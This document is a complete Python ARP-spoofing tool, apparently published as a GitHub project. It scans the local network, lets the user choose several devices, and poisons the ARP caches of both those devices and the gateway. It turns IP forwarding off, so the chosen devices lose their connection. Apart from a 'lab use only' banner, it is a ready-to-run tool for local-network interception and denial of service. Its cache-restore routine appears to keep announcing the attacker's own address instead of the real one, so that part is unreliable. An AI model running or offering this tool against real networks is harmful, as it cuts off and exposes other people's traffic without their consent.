#!/usr/bin/env python3
"""
multi-arpspoof.py — Multi-target ARP spoofing tool for controlled lab environments.

Requirements:
    sudo apt install arp-scan dsniff net-tools

Usage:
    sudo python3 multi-arpspoof.py [-i INTERFACE] [-g GATEWAY]
"""

import argparse
import os
import re
import signal
import subprocess
import sys
import time
from collections import OrderedDict

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
DEFAULT_IFACE = "wlan0"
OUI_FILE = "/usr/share/arp-scan/ieee-oui.txt"
RESTORE_COUNT = 6
SPOOF_INTERVAL = 2   # seconds between status checks

# ──────────────────────────────────────────────
# GLOBALS
# ──────────────────────────────────────────────
active_procs = []
spoofed_targets = []
_cleaning_up = False

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────


def banner():
    print("""
\033[1;31m
  ███╗   ███╗██╗   ██╗██╗  ████████╗██╗      █████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗  ██████╗ ███████╗
  ████╗ ████║██║   ██║██║  ╚══██╔══╝██║     ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
  ██╔████╔██║██║   ██║██║     ██║   ██║     ███████║██████╔╝██████╔╝███████╗██████╔╝██║   ██║██║   ██║█████╗
  ██║╚██╔╝██║██║   ██║██║     ██║   ██║     ██╔══██║██╔══██╗██╔═══╝ ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝
  ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ███████╗██║  ██║██║  ██║██║     ███████║██║     ╚██████╔╝╚██████╔╝██║
  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝
\033[0m
  \033[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
  \033[33m  [~]\033[0m Multi-Target ARP Spoofing Tool
  \033[33m  [~]\033[0m Controlled Lab Use Only
  \033[33m  [~]\033[0m github.com/1024Cyber/multi-arpspoof
  \033[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
""")

    
def check_root():
    if os.geteuid() != 0:
        sys.exit("[!] Run as root: sudo python3 multi-arpspoof.py")


def check_deps():
    missing = []
    for tool in ("arp-scan", "arpspoof"):
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            missing.append(tool)
    if missing:
        sys.exit(f"[!] Missing tools: {', '.join(missing)}\n"
                 f"    sudo apt install arp-scan dsniff")


def get_gateway(iface):
    try:
        out = subprocess.check_output(["ip", "route", "show", "dev", iface], text=True)
        for line in out.splitlines():
            if line.startswith("default"):
                return line.split()[2]
    except Exception:
        pass
    return None


def disable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0\n")
    except Exception as e:
        print(f"[!] Could not write ip_forward: {e}")


# ──────────────────────────────────────────────
# OUI VENDOR LOOKUP
# ──────────────────────────────────────────────

_oui_table = {}

def load_oui():
    global _oui_table
    if not os.path.isfile(OUI_FILE):
        return
    with open(OUI_FILE, errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t", 1)
            if len(parts) == 2:
                prefix = parts[0].replace(":", "").replace("-", "").upper()
                _oui_table[prefix] = parts[1].strip()


def mac_vendor(mac):
    prefix = mac.replace(":", "").replace("-", "").upper()[:6]
    return _oui_table.get(prefix, "Unknown")


# ──────────────────────────────────────────────
# NETWORK SCAN
# ──────────────────────────────────────────────

def scan_network(iface):
    print(f"\n[*] Scanning {iface} — this may take a few seconds...")
    try:
        result = subprocess.run(
            ["arp-scan", "--interface", iface, "--localnet", "--retry=3"],
            capture_output=True, text=True, timeout=60
        )
    except subprocess.TimeoutExpired:
        print("[!] Scan timed out")
        return []

    devices = []
    for line in result.stdout.splitlines():
        parts = line.split("\t")
        if len(parts) >= 2 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[0]):
            ip = parts[0].strip()
            mac = parts[1].strip()
            vendor = parts[2].strip() if len(parts) > 2 else mac_vendor(mac)
            if not vendor or vendor == "(Unknown)":
                vendor = mac_vendor(mac)
            devices.append({"ip": ip, "mac": mac, "vendor": vendor})

    return devices


def print_devices(devices, gateway):
    print()
    print(f"  {'S/N':<5}  {'IP':<16}  {'MAC Address':<19}  {'Vendor'}")
    print(f"  {'─'*5}  {'─'*16}  {'─'*19}  {'─'*30}")
    for i, d in enumerate(devices, 1):
        gw_tag = " \033[33m[GW]\033[0m" if d["ip"] == gateway else ""
        print(f"  {i:<5}  {d['ip']:<16}  {d['mac']:<19}  {d['vendor']}{gw_tag}")
    print()
    print("  [0] Rescan")
    print()


# ──────────────────────────────────────────────
# ARP SPOOF
# Each child runs in its own process group (os.setsid)
# so SIGTERM/SIGKILL reaches it even after terminal closes
# ──────────────────────────────────────────────

def start_spoof(target_ip, gateway_ip, iface):
    def new_session():
        os.setsid()

    p1 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=new_session
    )
    p2 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=new_session
    )
    active_procs.extend([p1, p2])
    spoofed_targets.append((target_ip, gateway_ip, iface))
    print(f"  [+] Spoofing \033[32m{target_ip}\033[0m ↔ \033[32m{gateway_ip}\033[0m  "
          f"(PIDs {p1.pid}, {p2.pid})")


# ──────────────────────────────────────────────
# ARP RESTORE
# ──────────────────────────────────────────────

def restore_arp(target_ip, gateway_ip, iface):
    has_arping = subprocess.run(["which", "arping"], capture_output=True).returncode == 0

    for _ in range(RESTORE_COUNT):
        if has_arping:
            subprocess.run(
                ["arping", "-c", "1", "-U", "-I", iface, target_ip],
                capture_output=True
            )
            subprocess.run(
                ["arping", "-c", "1", "-U", "-I", iface, gateway_ip],
                capture_output=True
            )
        else:
            subprocess.run(
                ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
                capture_output=True
            )
            subprocess.run(
                ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
                capture_output=True
            )
        time.sleep(0.4)


# ──────────────────────────────────────────────
# CLEANUP
# ──────────────────────────────────────────────

def cleanup(signum=None, frame=None):
    global _cleaning_up
    if _cleaning_up:
        return
    _cleaning_up = True

    print("\n\n[*] Stopping all spoof processes...")

    # SIGTERM every process group
    for p in active_procs:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
        except Exception:
            try:
                p.terminate()
            except Exception:
                pass

    # Wait up to 3s, then SIGKILL survivors
    deadline = time.time() + 3
    for p in active_procs:
        remaining = deadline - time.time()
        try:
            p.wait(timeout=max(0.1, remaining))
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
        except Exception:
            pass

    # Restore ARP caches
    if spoofed_targets:
        print("[*] Restoring ARP tables — please wait...")
        for (target_ip, gateway_ip, iface) in spoofed_targets:
            print(f"  [~] Restoring {target_ip}")
            restore_arp(target_ip, gateway_ip, iface)

    disable_ip_forward()
    print("[+] IP forwarding confirmed OFF")
    print("[+] Cleanup complete.")
    sys.exit(0)


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Multi-target ARP spoofer")
    parser.add_argument("-i", "--iface", default=DEFAULT_IFACE,
                        help=f"Network interface (default: {DEFAULT_IFACE})")
    parser.add_argument("-g", "--gateway", default=None,
                        help="Gateway IP (auto-detected if omitted)")
    args = parser.parse_args()

    iface = args.iface
    gateway = args.gateway

    check_root()
    check_deps()
    banner()
    load_oui()

    # Force IP forwarding OFF at launch — no exceptions
    disable_ip_forward()
    print("[*] IP forwarding: \033[1;31mOFF\033[0m — traffic will be dropped (not relayed)\n")

    # Gateway detection
    if not gateway:
        gateway = get_gateway(iface)
    if not gateway:
        gateway = input("[?] Could not auto-detect gateway. Enter gateway IP: ").strip()

    print(f"[*] Interface : {iface}")
    print(f"[*] Gateway   : {gateway}")

    # Register signal handlers BEFORE any children are spawned
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # ── Scan / selection loop ──
    targets = []
    while True:
        devices = scan_network(iface)

        if not devices:
            print("[!] No devices found.")
            input("    Press Enter to rescan...")
            continue

        print_devices(devices, gateway)

        raw = input("  Enter S/N(s) to spoof (comma-separated), or 0 to rescan: ").strip()

        if raw == "0":
            continue

        selections = []
        invalid = []
        for tok in raw.split(","):
            tok = tok.strip()
            if not tok.isdigit():
                invalid.append(tok)
                continue
            idx = int(tok)
            if idx < 1 or idx > len(devices):
                invalid.append(str(idx))
            else:
                selections.append(idx)

        if invalid:
            print(f"[!] Invalid entries ignored: {', '.join(invalid)}")

        if not selections:
            print("[!] No valid targets selected.")
            continue

        selections = list(OrderedDict.fromkeys(selections))

        print("\n[*] Targets selected:")
        for idx in selections:
            d = devices[idx - 1]
            if d["ip"] == gateway:
                print(f"    [{idx}] {d['ip']}  \033[31m(gateway — skipping)\033[0m")
            else:
                print(f"    [{idx}] {d['ip']}  {d['mac']}  {d['vendor']}")

        targets = [devices[i - 1] for i in selections if devices[i - 1]["ip"] != gateway]

        if not targets:
            print("[!] No valid targets after filtering.")
            continue

        confirm = input("\n  Start spoofing? [Y/n]: ").strip().lower()
        if confirm == "n":
            continue

        break

    # ── Launch spoof processes ──
    print(f"\n[+] Launching spoof for {len(targets)} target(s)...\n")

    for t in targets:
        start_spoof(t["ip"], gateway, iface)
        time.sleep(0.3)   # stagger init so arpspoof processes don't race

    print(f"\n\033[1;32m[+] Active on {len(targets)} target(s). Press Ctrl+C to stop.\033[0m\n")

    # ── Status loop ──
    elapsed = 0
    while True:
        time.sleep(SPOOF_INTERVAL)
        elapsed += SPOOF_INTERVAL

        dead = [p for p in active_procs if p.poll() is not None]
        alive = len(active_procs) - len(dead)
        mins, secs = divmod(elapsed, 60)

        status = (f"  [~] {mins:02d}:{secs:02d} elapsed | "
                  f"{alive}/{len(active_procs)} processes alive")

        if dead:
            status += f"  \033[31m[!] {len(dead)} died\033[0m"

        print(status, end="\r", flush=True)


if __name__ == "__main__":
    main()
